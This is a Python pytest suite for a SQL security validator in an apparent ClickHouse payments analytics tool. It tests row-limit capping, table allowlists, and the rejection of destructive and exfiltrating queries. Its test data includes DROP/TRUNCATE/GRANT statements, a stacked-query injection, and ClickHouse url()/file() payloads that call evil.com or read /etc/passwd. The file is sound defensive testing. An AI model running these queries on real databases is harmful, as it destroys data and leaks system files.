"""Tests for SQL security validation, injection prevention, and limit enforcement."""

import pytest

from paystat.security.validator import SQLSecurityError, SQLSecurityValidator


@pytest.fixture
def validator() -> SQLSecurityValidator:
    return SQLSecurityValidator(
        allowed_tables={"transactions", "analytics.transactions"},
        max_rows=500,
    )


def test_valid_select_query(validator: SQLSecurityValidator) -> None:
    """Valid SELECT query must pass and have LIMIT appended."""
    query = "SELECT email, sum(amount) FROM transactions WHERE complete = 1 GROUP BY email"
    result = validator.validate_and_prepare_query(query)
    assert "LIMIT 500" in result
    assert "FROM transactions" in result


def test_custom_limit_capped(validator: SQLSecurityValidator) -> None:
    """Explicit LIMIT exceeding max_rows must be capped to max_rows."""
    query = "SELECT * FROM transactions LIMIT 100000"
    result = validator.validate_and_prepare_query(query)
    assert "LIMIT 500" in result
    assert "100000" not in result


def test_comma_offset_limit_capped(validator: SQLSecurityValidator) -> None:
    """LIMIT offset, count exceeding max_rows must have count capped."""
    query = "SELECT * FROM transactions LIMIT 10, 99999"
    result = validator.validate_and_prepare_query(query)
    assert "LIMIT 10, 500" in result
    assert "99999" not in result


def test_limit_with_trailing_comment(validator: SQLSecurityValidator) -> None:
    """Appended LIMIT must not be trapped inside a line comment."""
    query = "SELECT * FROM transactions\n-- filter note"
    result = validator.validate_and_prepare_query(query)
    assert "LIMIT 500" in result
    # Check that LIMIT occurs before or outside the comment line
    lines = result.split("\n")
    limit_line = [line for line in lines if "LIMIT 500" in line][0]
    assert not limit_line.strip().startswith("--")


def test_limit_with_settings_and_format(validator: SQLSecurityValidator) -> None:
    """LIMIT must precede ClickHouse SETTINGS and FORMAT clauses."""
    query = "SELECT * FROM transactions SETTINGS max_threads=2 FORMAT JSON"
    result = validator.validate_and_prepare_query(query)
    limit_pos = result.upper().find("LIMIT 500")
    settings_pos = result.upper().find("SETTINGS")
    format_pos = result.upper().find("FORMAT JSON")

    assert limit_pos != -1
    assert settings_pos != -1
    assert format_pos != -1
    assert limit_pos < settings_pos < format_pos


def test_table_functions_rejected_if_not_in_allowlist(validator: SQLSecurityValidator) -> None:
    """Table functions like numbers() must be blocked by table allowlist."""
    query = "SELECT * FROM numbers(1000000000)"
    with pytest.raises(SQLSecurityError, match="Доступ к таблице или функции 'numbers' запрещен"):
        validator.validate_and_prepare_query(query)


@pytest.mark.parametrize(
    "forbidden_sql",
    [
        "DROP TABLE transactions",
        "TRUNCATE TABLE transactions",
        "DELETE FROM transactions WHERE 1=1",
        "ALTER TABLE transactions DROP COLUMN amount",
        "INSERT INTO transactions (email) VALUES ('hacker@evil.com')",
        "GRANT ALL ON *.* TO hacker",
        "SYSTEM DROP DNS CACHE",
        "KILL QUERY WHERE 1=1",
    ],
)
def test_destructive_operations_rejected(
    validator: SQLSecurityValidator, forbidden_sql: str
) -> None:
    """DDL/DML operations must be strictly rejected."""
    with pytest.raises(SQLSecurityError):
        validator.validate_and_prepare_query(forbidden_sql)


def test_stacked_query_injection_blocked(validator: SQLSecurityValidator) -> None:
    """Stacked queries via semicolon must be blocked."""
    injection = "SELECT * FROM transactions; DROP TABLE transactions;"
    with pytest.raises(SQLSecurityError, match="Запрещено выполнять несколько"):
        validator.validate_and_prepare_query(injection)


def test_unauthorized_table_access_blocked(validator: SQLSecurityValidator) -> None:
    """Querying tables outside allowlist must be blocked."""
    query = "SELECT * FROM users_credentials"
    with pytest.raises(
        SQLSecurityError, match="Доступ к таблице или функции 'users_credentials' запрещен"
    ):
        validator.validate_and_prepare_query(query)


@pytest.mark.parametrize(
    "malicious_func_sql",
    [
        "SELECT * FROM url('http://evil.com/leak', CSV)",
        "SELECT * FROM s3('https://s3.amazonaws.com/bucket/key', 'CSV')",
        "SELECT * FROM file('/etc/passwd', LineAsString)",
    ],
)
def test_forbidden_clickhouse_functions_blocked(
    validator: SQLSecurityValidator, malicious_func_sql: str
) -> None:
    """Accessing network or local files through ClickHouse functions must be blocked."""
    with pytest.raises(SQLSecurityError):
        validator.validate_and_prepare_query(malicious_func_sql)


def test_inline_comment_stripped_and_limit_applied(validator: SQLSecurityValidator) -> None:
    """Inline comment must not swallow the appended LIMIT."""
    result = validator.validate_and_prepare_query("SELECT * FROM transactions -- note")
    assert "--" not in result
    assert result.endswith("LIMIT 500")


def test_comment_markers_inside_string_literal_preserved(validator: SQLSecurityValidator) -> None:
    """'--' and '/*' inside string literals are data, not comments."""
    result = validator.validate_and_prepare_query(
        "SELECT * FROM transactions WHERE system = 'a -- b /* c'"
    )
    assert "'a -- b /* c'" in result
    assert result.endswith("LIMIT 500")


def test_limit_inside_subquery_or_literal_does_not_count(validator: SQLSecurityValidator) -> None:
    """Only the outer LIMIT counts; LIMIT in subquery, comment or string is ignored."""
    sub = "SELECT * FROM transactions WHERE email IN (SELECT email FROM transactions LIMIT 5)"
    assert validator.validate_and_prepare_query(sub).endswith("LIMIT 500")
    lit = "SELECT * FROM transactions WHERE system = 'x LIMIT 5 y'"
    assert validator.validate_and_prepare_query(lit).endswith("LIMIT 500")
    cmt = "SELECT * FROM transactions /* LIMIT 5 */"
    assert validator.validate_and_prepare_query(cmt).endswith("LIMIT 500")


def test_limit_by_does_not_count_as_outer_limit(validator: SQLSecurityValidator) -> None:
    """LIMIT n BY col is not a row cap for the whole result."""
    result = validator.validate_and_prepare_query(
        "SELECT * FROM transactions LIMIT 2000 BY email"
    )
    assert result.endswith("LIMIT 2000 BY email LIMIT 500")


def test_expression_limit_and_union_are_wrapped(validator: SQLSecurityValidator) -> None:
    """Non-literal LIMIT and set operations are capped through an outer SELECT."""
    expr = validator.validate_and_prepare_query("SELECT * FROM transactions LIMIT 400 + 400")
    assert expr.startswith("SELECT * FROM (") and expr.endswith("LIMIT 500")
    union = validator.validate_and_prepare_query(
        "SELECT * FROM transactions UNION ALL SELECT * FROM transactions"
    )
    assert union.startswith("SELECT * FROM (") and union.endswith("LIMIT 500")


def test_cte_allowed_and_hidden_tables_blocked(validator: SQLSecurityValidator) -> None:
    """CTE names are allowed; tables read inside CTE bodies and subqueries are checked."""
    ok = "WITH x AS (SELECT * FROM transactions) SELECT * FROM x"
    assert "FROM x" in validator.validate_and_prepare_query(ok)
    for bad in (
        "WITH x AS (SELECT * FROM secret) SELECT * FROM transactions",
        "SELECT * FROM transactions WHERE a IN (SELECT a FROM secret)",
        "SELECT * FROM transactions p JOIN secret s ON 1 = 1",
        "SELECT * FROM transactions UNION ALL SELECT * FROM secret",
        "SELECT * FROM transactions, secret",
    ):
        with pytest.raises(SQLSecurityError, match="'secret' запрещен"):
            validator.validate_and_prepare_query(bad)


def test_schema_qualified_tables(validator: SQLSecurityValidator) -> None:
    """Only allowlisted schema-qualified names pass."""
    assert "analytics.transactions" in validator.validate_and_prepare_query(
        "SELECT * FROM analytics.transactions"
    )
    with pytest.raises(SQLSecurityError, match="otherdb.transactions"):
        validator.validate_and_prepare_query("SELECT * FROM otherdb.transactions")


def test_from_inside_function_is_not_table(validator: SQLSecurityValidator) -> None:
    """EXTRACT(... FROM col) must not be treated as a table reference."""
    result = validator.validate_and_prepare_query(
        "SELECT extract(month FROM created) FROM transactions"
    )
    assert result.endswith("LIMIT 500")


def test_describe_checks_table_and_has_no_limit(validator: SQLSecurityValidator) -> None:
    """DESCRIBE goes through the allowlist and gets no LIMIT."""
    assert validator.validate_and_prepare_query("DESCRIBE TABLE transactions") == (
        "DESCRIBE TABLE transactions"
    )
    with pytest.raises(SQLSecurityError, match="'secret' запрещен"):
        validator.validate_and_prepare_query("DESCRIBE TABLE secret")


def test_system_column_allowed(validator: SQLSecurityValidator) -> None:
    """Column `system` (payment system) must not be blocked as a keyword."""
    result = validator.validate_and_prepare_query(
        "SELECT system, sum(amount) FROM transactions WHERE complete = 1 GROUP BY system"
    )
    assert result.endswith("LIMIT 500")
